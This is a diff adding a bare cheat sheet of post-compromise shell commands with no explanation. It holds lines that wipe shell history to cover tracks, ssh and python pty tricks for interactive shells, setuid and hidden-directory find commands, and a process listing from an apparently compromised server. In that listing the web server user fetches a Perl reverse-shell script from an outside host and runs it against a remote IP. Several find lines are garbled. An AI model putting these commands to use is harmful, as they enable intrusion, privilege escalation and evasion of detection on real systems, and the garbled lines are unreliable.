@@ -1,0 +1,41 @@
+﻿unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
+export HISTFILE =/dev/null
+export HISTSIZE = 0
+export HISTFILESIZE = 0
+
+
+ssh -o UserKnownHostsFile=/dev/null -T user@host '/bin/bash -i'
+ssh -o UserKnownHostsFile=/dev/null -T -p 5022 oracle@172.16.1.37 '/bin/bash -i'
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+Phpspy
+
+# Find / -uid 0- perm -4000 -print
+# Find / -size +10000 k-print
+# Find / -name “…”-print
+# Find / -name “..”-print
+# Find / -name “.”-Print
+# Find / -name “”-print
+
+[root@portoalegre ~]# ps -ef | grep sh
+root      2471     1  0 Sep24 ?        00:00:47 /usr/sbin/sshd
+apache    3559  2958  0 18:43 ?        00:00:00 sh -c uname -a;cd /tmp; rm -rf rshell.pl; wget http://www.badchecksum.net/code/pentest/rshell.pl; perl rshell.pl 207.44.206.66 21; rf -rf rshell.pl
+root      3623  3591  0 18:43 ?        00:00:00 sh
+root      3709  3623 75 18:44 ?        00:34:13 python -c import pty; pty.spawn("/bin/sh")
+root      3710  3709  0 18:44 pts/3    00:00:00 /bin/sh
+root      3714  3713  0 18:44 pts/3    00:00:00 bash
+root      6916    59  0 Oct05 ?        00:06:39 [pdflush]
+root      9339  2471  0 19:29 ?        00:00:00 sshd: root@pts/2
+root      9341  9339  0 19:29 pts/2    00:00:00 -bash
+root      9441  9341  0 19:29 pts/2    00:00:00 grep sh
+root     12824  2471  0 11:50 ?        00:00:00 sshd: root@pts/2
+root     15232    59  0 Oct20 ?        00:03:04 [pdflush]
+root     16477  2471  0 16:28 ?        00:00:00 sshd: root@pts/1
+root     16482 16477  0 16:28 pts/1    00:00:00 -bash
+apache   25279 24794  0 Oct21 ?        00:00:00 sh -c uname -a;cd /tmp; rm -rf rshell.pl; wget http://www.badchecksum.net/code/pentest/rshell.pl; perl rshell.pl 207.44.206.66 21; rf -rf rshell.pl
+root     25286 25283  0 Oct21 ?        00:00:00 sh
+root     25360 25286 92 Oct21 ?        18:42:04 python -c import pty; pty.spawn("/bin/sh")
+root     25361 25360  0 Oct21 pts/0    00:00:00 /bin/sh
+root     25363 25362  0 Oct21 pts/0    00:00:00 bash
+
